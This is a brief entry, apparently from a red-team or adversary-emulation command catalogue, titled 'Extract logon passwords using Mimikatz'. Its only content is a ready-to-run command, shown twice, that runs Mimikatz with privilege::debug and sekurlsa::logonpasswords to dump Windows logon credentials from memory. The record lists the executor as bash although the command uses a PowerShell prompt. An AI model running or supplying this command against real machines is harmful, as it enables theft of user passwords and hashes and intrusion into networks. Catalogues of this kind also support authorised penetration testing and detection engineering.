---
id: b6423143-a7a8-4c60-994e-cc7457bbeb8f
name: Extract logon passwords using Mimikatz
type: command
executor: bash
data: PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords"
  exit
output: null
created_at: '2023-04-06T03:56:27.080190+00:00'
updated_at: '2023-04-10T20:37:17.351681+00:00'
---

# Extract logon passwords using Mimikatz

```bash
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```
